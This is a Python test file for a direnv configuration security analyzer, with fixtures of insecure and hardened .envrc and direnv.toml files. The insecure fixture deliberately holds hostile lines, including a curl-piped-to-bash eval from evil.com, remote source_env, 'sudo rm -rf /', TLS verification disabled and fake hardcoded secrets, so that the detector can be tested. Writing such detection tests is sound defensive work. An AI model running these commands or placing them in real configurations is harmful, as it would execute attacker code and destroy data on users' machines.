"""Tests for DirenvAnalyzer."""

from pathlib import Path

from devai.direnv_analyzer import DirenvAnalyzer, DirenvFinding


INSECURE_ENVRC = """\
# Insecure direnv configuration
export API_KEY="hardcoded-secret-token-12345"
export DATABASE_PASSWORD="leaked-db-password"

layout python
PATH_add ./bin
PATH_add /tmp/evil

dotenv .env
watch_file .env
watch_file credentials.json

source_env http://evil.com/envrc
source_up http://user:pass@github.com/org/repo/.envrc

use flake github:org/repo?ref=main
use nix -f https://github.com/NixOS/nixpkgs?ref=master

eval "$(curl http://evil.com/hook.sh | bash)"
run curl --insecure https://example.com && export GIT_SSL_NO_VERIFY=1
run sudo rm -rf / && chmod 777 /tmp

STRICT_ENV=0
load_prefix .aws
"""

INSECURE_DIRENV_TOML = """\
[global]
strict_env = false

[whitelist]
prefix = ["/tmp"]
"""

HARDENED_ENVRC = """\
layout python

dotenv_if_exists .env.local

use flake

PATH_add "$PWD/bin"

watch_file flake.lock
"""

HARDENED_DIRENV_TOML = """\
[global]
strict_env = true
"""


class TestDirenvAnalyzer:
    def test_detects_insecure_envrc(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(INSECURE_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "curl_pipe_shell" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "strict_env_disabled" in kinds
        assert "sensitive_path" in kinds
        assert "writable_path_add" in kinds
        assert "unpinned_nix_ref" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_insecure_direnv_toml(self, tmp_path: Path):
        (tmp_path / "direnv.toml").write_text(INSECURE_DIRENV_TOML, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "strict_env_disabled" for f in findings)

    def test_hardened_config_passes(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(HARDENED_ENVRC, encoding="utf-8")
        (tmp_path / "direnv.toml").write_text(HARDENED_DIRENV_TOML, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert not high
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = DirenvAnalyzer(str(tmp_path))
        assert analyzer.configs() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = DirenvFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path=".envrc",
            lineno=3,
            line="export API_KEY=bad",
        )
        assert "[high]" in finding.format()
        assert ".envrc:3" in finding.format()

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / ".envrc").write_text(INSECURE_ENVRC, encoding="utf-8")
        analyzer = DirenvAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Direnv analysis:" in context
        assert "health score:" in context
        assert "hardcoded_secret" in context or "[high]" in context

    def test_generate_hardened_config(self):
        analyzer = DirenvAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "layout python" in config
        assert "dotenv_if_exists" in config

    def test_detects_envrc_local(self, tmp_path: Path):
        (tmp_path / ".envrc.local").write_text(
            "export SECRET_TOKEN=\"leaked-local-token\"\n",
            encoding="utf-8",
        )
        analyzer = DirenvAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "hardcoded_secret" for f in findings)
